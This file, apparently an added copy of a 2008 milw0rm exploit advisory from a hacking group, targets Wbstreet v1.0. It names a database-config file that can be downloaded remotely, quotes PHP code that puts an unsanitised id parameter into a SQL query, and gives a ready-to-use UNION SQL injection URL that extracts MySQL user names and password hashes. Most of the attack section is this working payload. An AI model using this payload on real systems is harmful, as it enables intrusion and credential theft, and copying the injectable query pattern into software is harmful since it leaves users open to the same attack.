@@ -1,0 +1,66 @@
+===================================================================
+  Wbstreet v.1.0 (show.php id) Remote SQL Injection Vulnerability
+===================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 4 December 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : Wbstreet 
+ VERSION     : v.1.0
+ VENDOR	     : www.phpstreet.com
+ DOWNLOAD    : www.ohlanla.com/Dowsload/177254922054.zip
+#####################################################
+
+-- Remote Database Disclosure --
+
+
+[+] http://[Target]/[path]/connect.inc
+
+
+-- Remote SQL Injection ---
+
+-----------------
+ Vulnerable Code
+-----------------
+
+if(isset($_GET['id'])){
+	$id=$_GET['id'];
+}
+	.
+	.
+	.
+	.
+<? 
+$rs=mysql_db_query($db_name, "select * from topic where id=$id");  <<<< Bug !!!!
+$row=mysql_fetch_array($rs);
+?>
+
+----------
+ Exploit
+----------
+
+[+] http://[Target]/[path]/show.php?id=1/**/AND/**/1=2/**/UNION/**/SELECT/**/1,concat(user,0x3a3a,password),1,1,1,1,1,1/**/FROM/**/mysql.user
+
+
+#####################################################################
+ Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos   
+ Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+# milw0rm.com [2008-12-04]
